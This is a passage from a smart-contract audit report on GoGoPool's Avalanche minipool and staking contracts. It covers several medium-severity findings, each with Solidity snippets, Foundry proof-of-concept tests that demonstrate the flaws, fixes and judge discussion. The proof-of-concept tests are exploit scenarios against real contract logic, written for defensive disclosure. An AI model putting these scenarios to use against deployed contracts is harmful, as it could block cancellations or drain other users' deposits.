*Submitted by [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/648), also found by [peritoflores](https://github.com/code-423n4/2022-12-gogopool-findings/issues/811), [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/674), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/646), [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/575), [slowmoses](https://github.com/code-423n4/2022-12-gogopool-findings/issues/464), [supernova](https://github.com/code-423n4/2022-12-gogopool-findings/issues/374), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/239), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/157), and [chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/92)*

When doing inflation, function `getInflationAmt()` calculated number of intervals elapsed by dividing the duration with interval length.

```solidity
function getInflationIntervalsElapsed() public view returns (uint256) {
    ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
    uint256 startTime = getInflationIntervalStartTime();
    if (startTime == 0) {
        revert ContractHasNotBeenInitialized();
    }
    return (block.timestamp - startTime) / dao.getInflationIntervalSeconds();
}
```

As we can noticed that, this calculation is rounding down, it means if `block.timestamp - startTime = 1.99 intervals`, it only account for `1 interval`.

However, when updating start time after inflating, it still update to current timestamp while it should only increased by `intervalLength * intervalsElapsed` instead.

```solidity
addUint(keccak256("RewardsPool.InflationIntervalStartTime"), inflationIntervalElapsedSeconds); 
// @audit should only update to oldStartTime + inverval * numInterval
setUint(keccak256("RewardsPool.RewardsCycleTotalAmt"), newTokens);
```

Since default value of inflation interval = 1 days and reward cycle length = 14 days, so the impact is reduced. However, these configs can be changed in the future.

### Proof of Concept

Consider the scenario:

1.  Assume last inflation time is `InflationIntervalStartTime = 100`. `InflationIntervalSeconds = 50`.
2.  At `timestamp = 199`, function `getInflationAmt()` will calculate

```solidity
inflationIntervalsElapsed = (199 - 100) / 50 = 1
// Compute inflation for total inflation intervals elapsed
for (uint256 i = 0; i < inflationIntervalsElapsed; i++) {
    newTotalSupply = newTotalSupply.mulWadDown(inflationRate);
} // @audit only loop once.
```

3.  And then in `inflate()` function, `InflationIntervalStartTime` is still updated to current timestamp, so `InflationIntervalStartTime = 199`.
4.  If this sequence of actions are repeatedly used, we can easily see

```solidity
InflationIntervalStartTime = 199, inflated count = 1
InflationIntervalStartTime = 298, inflated count = 2
InflationIntervalStartTime = 397, inflated count = 3
InflationIntervalStartTime = 496, inflated count = 4
InflationIntervalStartTime = 595, inflated count = 5
```

While at `timestamp = 595`, inflated times should be
`(595 - 100) / 50 = 9` instead.

### Recommended Mitigation Steps

Consider only increasing `InflationIntervalStartTime` by the amount of intervals time interval length.

**[emersoncloud (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/648#issuecomment-1379452071):**
 > I agree with this issue, but assets can't be stolen, lost or compromised directly. Medium severity is more appropriate (<https://docs.code4rena.com/awarding/judging-criteria#estimating-risk>)

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/648#issuecomment-1407742757):**
 > I have considered a Higher Severity, due to logical flaws.
> 
> However, I believe that the finding
> - Relies on the Condition of being called less than intended
> - Causes an incorrect amount of emissions (logically close to loss of Yield)
> 
> For those reasons, I believe Medium Severity to be the most appropriate

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/648#issuecomment-1421426366):**
 > Acknowledged, not fixing in this first version of the protocol.
> 
> We can and will have rialto call startRewardsCycle if needed, and think it's unlikely to become delayed.



***

## [[M-07] Rialto may not be able to cancel minipools created by contracts that cannot receive AVAX](https://github.com/code-423n4/2022-12-gogopool-findings/issues/623)
*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/623), also found by [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/809), [peritoflores](https://github.com/code-423n4/2022-12-gogopool-findings/issues/686), and [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/146)*

A malicious node operator may create a minipool that cannot be cancelled.

### Proof of Concept

Rialto may cancel a minipool by calling [cancelMinipoolByMultisig](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L520), however the function sends AVAX to the minipool owner, and the owner may block receiving of AVAX, causing the call to `cancelMinipoolByMultisig` to fail ([MinipoolManager.sol#L664](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664)):

```solidity
function _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {
  ...
  address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));
  ...
  owner.safeTransferETH(avaxNodeOpAmt);
}
```

The following PoC demonstrates how calls to `cancelMinipoolByMultisig` can be blocked:

```solidity
function testCancelMinipoolByMultisigDOS_AUDIT() public {
  uint256 duration = 2 weeks;
  uint256 depositAmt = 1000 ether;
  uint256 avaxAssignmentRequest = 1000 ether;
  uint128 ggpStakeAmt = 200 ether;

  // Node operator is a contract than cannot receive AVAX:
  // contract NodeOpContract {}
  NodeOpContract nodeOpContract = new NodeOpContract();
  dealGGP(address(nodeOpContract), ggpStakeAmt);
  vm.deal(address(nodeOpContract), depositAmt);

  vm.startPrank(address(nodeOpContract));
  ggp.approve(address(staking), MAX_AMT);
  staking.stakeGGP(ggpStakeAmt);
  MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
  vm.stopPrank();

  bytes32 errorCode = "INVALID_NODEID";
  int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
  store.setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));

  // Rialto trices to cancel the minipool created by the node operator contract but the transaction reverts since
  // the node operator contract cannot receive AVAX.
  vm.prank(address(rialto));
  // FAIL: reverted with ETH_TRANSFER_FAILED
  minipoolMgr.cancelMinipoolByMultisig(mp1.nodeID, errorCode);
}
```

### Recommended Mitigation Steps

Consider using the [Pull over Push pattern](https://fravoll.github.io/solidity-patterns/pull_over_push.html) to return AVAX to owners of minipools that are canceled by Rialto.

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/623)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/623#issuecomment-1407735453):**
 > The warden has shown how the checked return value from call can be used as a grief to prevent canceling of a minipool.
> 
> The finding can have different severities based on the context, in this case, the cancelling can be denied, however, other state transitions are still possible.
> 
> For this reason (functionality is denied), I agree with Medium Severity.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/623#issuecomment-1421428356):**
 > Acknowledged. 
> 
> We'll make a note of this in our documentation, but not fixing immediately.



***

## [[M-08] Recreated pools receive a wrong AVAX amount due to miscalculated compounded liquid staker amount](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620)
*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620), also found by [yixxas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/501), [Franfran](https://github.com/code-423n4/2022-12-gogopool-findings/issues/489), and [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/347)*

After recreation, minipools will receive more AVAX than the sum of their owners' current stake and the rewards that they generated.

### Proof of Concept

Multipools that successfully finished validation may be recreated by multisigs, before staked GGP and deposited AVAX have been withdrawn by minipool owners ([MinipoolManager.sol#L444](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L444)). The function compounds deposited AVAX by adding the rewards earned during previous validation periods to the AVAX amounts deposited and requested from stakers ([MinipoolManager.sol#L450-L452](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L450-L452)):

```solidity
Minipool memory mp = getMinipool(minipoolIndex);
// Compound the avax plus rewards
// NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio
uint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;
setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), compoundedAvaxNodeOpAmt);
setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), compoundedAvaxNodeOpAmt);
```

The function assumes that a node operator and liquid stakers earned an equal reward amount: `compoundedAvaxNodeOpAmt` is calculated as the sum of the current AVAX deposit of the minipool owner and the node operator reward earned so far. However, liquid stakers get a smaller reward than node operators: the minipool node commission fee is applied to their share ([MinipoolManager.sol#L417](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L417)):

```solidity
  uint256 avaxHalfRewards = avaxTotalRewardAmt / 2;

  // Node operators recv an additional commission fee
  ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
  uint256 avaxLiquidStakerRewardAmt = avaxHalfRewards - avaxHalfRewards.mulWadDown(dao.getMinipoolNodeCommissionFeePct());
  uint256 avaxNodeOpRewardAmt = avaxTotalRewardAmt - avaxLiquidStakerRewardAmt;
```

As a result, the `avaxLiquidStakerAmt` set in the `recreateMinipool` function will always be bigger than the actual amount since it equals to the compounded node operator amount, which includes node operator rewards.

Next, in the `recreateMinipool` function, the assigned AVAX amount is increased by the amount borrowed from liquid stakers + the node operator amount, which is again wrong because the assigned AVAX amount can only be increased by the liquid stakers' reward share ([MinipoolManager.sol#L457-L459](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L457-L459)):

```solidity
staking.increaseAVAXStake(mp.owner, mp.avaxNodeOpRewardAmt);
staking.increaseAVAXAssigned(mp.owner, compoundedAvaxNodeOpAmt);
staking.increaseMinipoolCount(mp.owner);
```

As a result, the amount of AVAX borrowed from liquid stakers by the minipool will be increased by the minipool node commission fee, the increased amount will be sent to the validator, and it will be required to end the validation period.

The following PoC demonstrates the wrong calculation:

```solidity
// test/unit/MinipoolManager.t.sol
function testRecreateMinipoolWrongLiquidStakerReward_AUDIT() public {
  uint256 duration = 4 weeks;
  uint256 depositAmt = 1000 ether;
  uint256 avaxAssignmentRequest = 1000 ether;
  uint256 validationAmt = depositAmt + avaxAssignmentRequest;
  // Enough to start but not to re-stake, we will add more later
  uint128 ggpStakeAmt = 100 ether;

  vm.startPrank(nodeOp);
  ggp.approve(address(staking), MAX_AMT);
  staking.stakeGGP(ggpStakeAmt);
  MinipoolManager.Minipool memory mp = createMinipool(depositAmt, avaxAssignmentRequest, duration);
  vm.stopPrank();

  address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
  vm.prank(liqStaker1);
  ggAVAX.depositAVAX{value: MAX_AMT}();

  vm.prank(address(rialto));
  minipoolMgr.claimAndInitiateStaking(mp.nodeID);

  bytes32 txID = keccak256("txid");
  vm.prank(address(rialto));
  minipoolMgr.recordStakingStart(mp.nodeID, txID, block.timestamp);

  skip(duration / 2);

  // Give rialto the rewards it needs
  uint256 rewards = 10 ether;
  deal(address(rialto), address(rialto).balance + rewards);

  // Pay out the rewards
  vm.prank(address(rialto));
  minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(mp.nodeID, block.timestamp, rewards);
  MinipoolManager.Minipool memory mpAfterEnd = minipoolMgr.getMinipoolByNodeID(mp.nodeID);
  assertEq(mpAfterEnd.avaxNodeOpAmt, depositAmt);
  assertEq(mpAfterEnd.avaxLiquidStakerAmt, avaxAssignmentRequest);

  // After the validation periods has ended, the node operator and liquid stakers got different rewards,
  // since a fee was taken from the liquid stakers' share.
  uint256 nodeOpReward = 5.75 ether;
  uint256 liquidStakerReward = 4.25 ether;
  assertEq(mpAfterEnd.avaxNodeOpRewardAmt, nodeOpReward);
  assertEq(mpAfterEnd.avaxLiquidStakerRewardAmt, liquidStakerReward);

  // Add a bit more collateral to cover the compounding rewards
  vm.prank(nodeOp);
  staking.stakeGGP(1 ether);

  vm.prank(address(rialto));
  minipoolMgr.recreateMinipool(mp.nodeID);

  MinipoolManager.Minipool memory mpCompounded = minipoolMgr.getMinipoolByNodeID(mp.nodeID);
  // After pool was recreated, node operator's amounts were increased correctly.
  assertEq(mpCompounded.avaxNodeOpAmt, mp.avaxNodeOpAmt + nodeOpReward);
  assertEq(mpCompounded.avaxNodeOpAmt, mp.avaxNodeOpInitialAmt + nodeOpReward);
  assertEq(staking.getAVAXStake(mp.owner), mp.avaxNodeOpAmt + nodeOpReward);

  // However, liquid stakers' amount were increased incorrectly: nodeOpReward was added instead of liquidStakerReward.
  // These assertions will fail:
  // expected: 1004.25 ether, actual 1005.75 ether
  assertEq(mpCompounded.avaxLiquidStakerAmt, mp.avaxLiquidStakerAmt + liquidStakerReward);
  assertEq(staking.getAVAXAssigned(mp.owner), mp.avaxLiquidStakerAmt + liquidStakerReward);
}
```

### Recommended Mitigation Steps

When compounding rewards in the `recreateMinipool` function, consider using an average reward so that node operator's and liquid stakers' deposits are increased equally and the entire reward amount is used:

```diff
--- a/contracts/contract/MinipoolManager.sol
+++ b/contracts/contract/MinipoolManager.sol
@@ -443,18 +443,22 @@ contract MinipoolManager is Base, ReentrancyGuard, IWithdrawer {
        /// @param nodeID 20-byte Avalanche node ID
        function recreateMinipool(address nodeID) external whenNotPaused {
                int256 minipoolIndex = onlyValidMultisig(nodeID);
                requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);
                Minipool memory mp = getMinipool(minipoolIndex);
                // Compound the avax plus rewards
                // NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio
-               uint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;
+               uint256 nodeOpRewardAmt = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpRewardAmt")));
+               uint256 liquidStakerRewardAmt = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerRewardAmt")));
+               uint256 avgRewardAmt = (nodeOpRewardAmt + liquidStakerRewardAmt) / 2;
+
+               uint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + avgRewardAmt;
                setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), compoundedAvaxNodeOpAmt);
                setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), compoundedAvaxNodeOpAmt);

                Staking staking = Staking(getContractAddress("Staking"));
                // Only increase AVAX stake by rewards amount we are compounding
                // since AVAX stake is only decreased by withdrawMinipool()
-               staking.increaseAVAXStake(mp.owner, mp.avaxNodeOpRewardAmt);
+               staking.increaseAVAXStake(mp.owner, avgRewardAmt);
                staking.increaseAVAXAssigned(mp.owner, compoundedAvaxNodeOpAmt);
                staking.increaseMinipoolCount(mp.owner);
```

Also, consider sending equal amounts of rewards to the vault and the ggAVAX token in the `recordStakingEnd` function.

**[emersoncloud (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1379479577):**
 > I need to do a bit more digging on my end, but this might be working as designed. Will come back to it. 

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1385310905):**
 > I think this is valid - don't think it is high though as there isn't really a loss of funds.

**[0xju1ie (GoGoPool) disputed and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1387167944):**
 > Talked to the rest of the team and this is not valid - it is working as designed. We are matching 1:1 with what the node operators are earning/staking.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1415662963):**
 > Will flag to triage but I agree with the sponsor.
> 
> The math is as follows:<br>
> -> Principal Deposited<br>
> -> Earned Rewards (both for Operator and Stakers)<br>
> -> Re-assing all -> Assigned amount has grown "too much" but in reality it's the correct value<br>
> -> When withdrawing, the operator only get's their portion of AVAX, meaning that the assigned as grown more, but they don't get an anomalous amount of rewards

**[Franfran (warden) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1415716742):**
 > @Alex the Entreprenerd & @0xju1ie - Could you please expand on why it's okay? There are multiple issues arising from this:
> - This function may return false while there is the correct amount of AVAX as `avaxLiquidStakerAmt` (in extreme cases)
> - This is going to pull too much funds from the `Manager`: https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L329
> - This will fake the "high water" value: https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L371
> - As there is a strict equality and that not all rewards may be sent by Rialto (only those really yielded by the validation), the staking end may never be triggered: https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L399-L403, same for the `recordStakingError`

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1416059877):**
 > @Franfran - I can chime in here. 
> 
> When recreating a minipool, we intend to allow Node Operators to compound their staking rewards for the next cycle. 
> 
> Say that a minipool with 2000 AVAX was running. After one cycle the minipool was rewarded 20 AVAX. 15 AVAX goes to Node Operators and 5 AVAX to Liquid Stakers (in this example). 
> 
> When we recreate the minipool we want to allow the Node Operator to run a minipool with 1015 AVAX. Right now we require a 1:1 match of Node Operator to Liquid Staker funds, so that means we'll withdraw 1015 AVAX from the Liquid Staking pool. That's 10 AVAX more than we deposited from this one minipool. We are relying on there being 10 free floating AVAX in the Liquid Staking fund to recreate this minipool.
> 
> The Warden says "The function assumes that a node operator and liquid stakers earned an equal reward amount". We're were not assuming that, but we are assuming that there will be some free AVAX in the Liquid Staker pool to withdraw more than we've just deposited from rewards.
> 
> All that being said, we do not like this assumption and will change to use `avaxLiquidStakerAmt` instead of `avaxNodeOpAmt` for both. Ensuring that we will always have enough Liquid Staker AVAX to recreate the minipool and we will maintain the one-to-one match.

**[Alex the Entreprenerd (judge) set severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1423878926):**
 > The warden has shown a potential risk when it comes to accounting, fees and the requirement on liquid funds, more specifically the accounting in storage will use the values earned by the validator, however when recreating new funds will need to be pulled.
> 
> The discrepancy may cause issues.
> 
> I believe this report has shown a potential risk, but I also think the Warden should have spent more time explaining it in depth vs stopping at the potential invariant being broken.
> 
> I'm flagging this out of caution after considering scrapping it / inviting the Wardens to follow up in mitigation review.

**[Jeiwan (warden) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1424187308):**
 > @emersoncloud - 
> > The Warden says "The function assumes that a node operator and liquid stakers earned an equal reward amount". We're were not assuming that
> 
> As can be seen from the linked code snippet (the comments, specifically):
> ```solidity
> // Compound the avax plus rewards
> // NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio
> uint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;
> ```
> 
> The assumption is that the 1:1 funds ratio is preserved after rewards have been accounted. This can only be true when the reward amounts are equal, which is violated due to the fees applied to `avaxLiquidStakerRewardAmt`.
> 
> @Alex the Entreprenerd - I'm sorry for not providing more details on how this can affect the entire system. Yes, my assumption was that extra staker funds would be required to recreate a pool, and there might be not enough funds staked (and deeper accounting may be affected, as pointed out by @Franfran), while the earned rewards + the previous staked amounts would be enough to recreate a pool.
> 
> Thus, the mitigation that uses `avaxLiquidStakerAmt` for both amounts looks good to me, since, out of the two amounts, the smaller one will always be picked, which won't require pulling extra funds from stakers. The difference between this mitigation and the mitigation suggested in the report, is that the latter uses the full reward amount in a recreated pool, while using `avaxLiquidStakerAmt` for both amounts leaves a portion of the reward idle.
> 
> I also agree with the medium severity, the High Risk label was probably a misclick.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Use liquid staker avax amount instead of node op amount: [multisig-labs/gogopool#43](https://github.com/multisig-labs/gogopool/pull/43)

**Status:** Mitigation not confirmed. Full details in [report from RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52), and also included in Mitigation Review section below.



***

## [[M-09] State Transition: Minipools can be created using other operator's AVAX deposit via recreateMinipool](https://github.com/code-423n4/2022-12-gogopool-findings/issues/569)
*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/569), also found by [bin2chen](undefined), [0xdeadbeef0x](undefined), [Aymen0909](undefined), [datapunk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/864), [Allarious](https://github.com/code-423n4/2022-12-gogopool-findings/issues/795), [RaymondFam](https://github.com/code-423n4/2022-12-gogopool-findings/issues/779), [adriro](https://github.com/code-423n4/2022-12-gogopool-findings/issues/753), [peritoflores](https://github.com/code-423n4/2022-12-gogopool-findings/issues/677), [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/647), [Jeiwan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/616), [SmartSek](https://github.com/code-423n4/2022-12-gogopool-findings/issues/584), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/498), [immeas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/491), [Franfran](https://github.com/code-423n4/2022-12-gogopool-findings/issues/484), [Nyx](https://github.com/code-423n4/2022-12-gogopool-findings/issues/439), [Ch\_301](https://github.com/code-423n4/2022-12-gogopool-findings/issues/423), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/398), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/362), [RaymondFam](https://github.com/code-423n4/2022-12-gogopool-findings/issues/353), [cccz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/332), [0Kage](https://github.com/code-423n4/2022-12-gogopool-findings/issues/324), and [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-gogopool-findings/issues/269)*

This issue is related to state transition of Minipools.<br>
According to the implementation, the possible states and transitions are as below.

![Imgur](https://imgur.com/ASL235O.jpg)

The Rialto may call `recreateMinipool` when the minipool is in states of `Withdrawable, Finished, Error, Canceled`.<br>
The problem is that these four states are not the same in the sense of holding the node operator's AVAX.<br>
If the state flow has followed `Prelaunch->Launched->Staking->Error`, all the AVAX are still in the vault.<br>
If the state flow has followed `Prelaunch->Launched->Staking->Error->Finished` (last transition by `withdrawMinipoolFunds`), all the AVAX are sent back to the node operator.<br>
So if the Rialto calls `recreateMinipool` for the second case, there are no AVAX deposited from the node operator at that point but there can be AVAX from other mini pools in the state of Prelaunch.<br>
Because there are AVAX in the vault (and these are not managed per staker base), `recreatePool` results in a new mini pool in `Prelaunch` state and it is further possible to go through the normal flow `Prelaunch->Launched->Staking->Withdrawable->Finished`.<br>
And the other minipool that was waiting for launch will not be able to launch because the vault is lack of AVAX.

Below is a test case written to show an example.

```solidity
function testAudit() public {
  uint256 duration = 2 weeks;
  uint256 depositAmt = 1000 ether;
  uint256 avaxAssignmentRequest = 1000 ether;
  uint256 validationAmt = depositAmt + avaxAssignmentRequest;
  uint128 ggpStakeAmt = 200 ether;

  // Node Op 1
  vm.startPrank(nodeOp);
  ggp.approve(address(staking), MAX_AMT);
  staking.stakeGGP(ggpStakeAmt);
  MinipoolManager.Minipool memory mp1 = createMinipool(
    depositAmt,
    avaxAssignmentRequest,
    duration
  );
  vm.stopPrank();

  // Node Op 2
  address nodeOp2 = getActorWithTokens("nodeOp2", MAX_AMT, MAX_AMT);
  vm.startPrank(nodeOp2);
  ggp.approve(address(staking), MAX_AMT);
  staking.stakeGGP(ggpStakeAmt);
  MinipoolManager.Minipool memory mp2 = createMinipool(
    depositAmt,
    avaxAssignmentRequest,
    duration
  );
  vm.stopPrank();

  int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);

  address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
  vm.prank(liqStaker1);
  ggAVAX.depositAVAX{ value: MAX_AMT }();

  // Node Op 1: Prelaunch->Launched
  vm.prank(address(rialto));
  minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

  bytes32 txID = keccak256("txid");
  vm.prank(address(rialto));
  // Node Op 1: Launched->Staking
  minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

  vm.prank(address(rialto));
  // Node Op 1: Staking->Error
  bytes32 errorCode = "INVALID_NODEID";
  minipoolMgr.recordStakingError{ value: validationAmt }(mp1.nodeID, errorCode);

  // There are 2*depositAmt AVAX in the pool manager
  assertEq(vault.balanceOf("MinipoolManager"), depositAmt * 2);

  // Node Op 1: Staking->Finished withdrawing funds
  vm.prank(nodeOp);
  minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);
  assertEq(staking.getAVAXStake(nodeOp), 0);
  mp1 = minipoolMgr.getMinipool(minipoolIndex);
  assertEq(mp1.status, uint256(MinipoolStatus.Finished));

  // Rialto recreate a minipool for the mp1
  vm.prank(address(rialto));
  // Node Op 1: Finished -> Prelaunch
  minipoolMgr.recreateMinipool(mp1.nodeID);

  assertEq(vault.balanceOf("MinipoolManager"), depositAmt);

  // Node Op 1: Prelaunch -> Launched
  vm.prank(address(rialto));
  minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

  // Node Op 1: Launched -> Staking
  vm.prank(address(rialto));
  minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

  assertEq(staking.getAVAXStake(nodeOp), 0);
  assertEq(staking.getAVAXAssigned(nodeOp), depositAmt);
  assertEq(staking.getAVAXAssignedHighWater(nodeOp), depositAmt);

  // now try to launch the second operator's pool, it will fail with InsufficientContractBalance
  vm.prank(address(rialto));
  vm.expectRevert(Vault.InsufficientContractBalance.selector);
  minipoolMgr.claimAndInitiateStaking(mp2.nodeID);
}

```

### Tools Used

Manual Review, Foundry

### Recommended Mitigation Steps

Make sure to keep the node operator's deposit status the same for all states that can lead to the same state.<br>
For example, for all states that can transition to Prelaunch, make sure to send the AVAX back to the user and get them back on the call `recreateMiniPool()`.

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/569)**

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/569#issuecomment-1408511782):**
 > I think [\#213](https://github.com/code-423n4/2022-12-gogopool-findings/issues/213) might be a better primary. This one primarily depends on minipools going to staking->error which wouldn't actually happen unless Rialto made a mistake.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/569#issuecomment-1415814227):**
 > The Warden has shown an issue with the FSM, Pools are allowed to perform the following transition<br>
> `Prelaunch->Launched->Staking->Error->Finished->Prelaunch` which allows to spin up the pool without funds.
> 
> This could only happen if Rialto performs a mistake, so the finding is limited to highlighting the issue with the State Transition.
> 
> For this reason, I believe Medium to be the most appropriate severity.

**[Franfran (warden) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/569#issuecomment-1415883621):**
 > @Alex the Entreprenerd - Please note that the issue is not limited to Rialto doing a mistake, but it's actually possible to trick it by frontrunning the Rialto transaction as outlined in my finding: [\#484 (comment)](https://github.com/code-423n4/2022-12-gogopool-findings/issues/484#issuecomment-1382584856)<br>
That's why the high severity was chosen initially.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Atomically recreate minipool so a node operator can't withdraw inbetween: [multisig-labs/gogopool#23](https://github.com/multisig-labs/gogopool/pull/23)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/15) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/34).



***

## [[M-10] Functions `cancelMinipool()` doesn't reset the value of the `RewardsStartTime` for user when user's `minipoolcount` is zero](https://github.com/code-423n4/2022-12-gogopool-findings/issues/555)
*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/555), also found by [caventa](https://github.com/code-423n4/2022-12-gogopool-findings/issues/522) and [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/251)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L271-L283><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L642-L665>

The value of `RewardsStartTime`  shows when node runner started the minipool and validation rewards are generated by node runner. it is used to see if node runners are eligible for ggp rewards or not and node runners should run their node for minimum amount of time during the rewarding cycle to be eligible for rewards. but right now node runner can create a mimipool and cancel it (after waiting time) and even so the minipool generated no rewards and cancelled the value of `RewardsStartTime` won't get reset for node runner and in the end of the cycle node runner would be eligible for rewards (node runner can create another minipool near the end of cycle). so this issue would cause wrong reward distribution between node runners and code doesn't correctly track `RewardsStartTime` for node runners and malicious node runners can use this issue and receive rewards without running validation nodes for the minimum amount of required time.

### Proof of Concept

This is `cancelMinipool()` and `_cancelMinipoolAndReturnFunds()` code:

    	function cancelMinipool(address nodeID) external nonReentrant {
    		Staking staking = Staking(getContractAddress("Staking"));
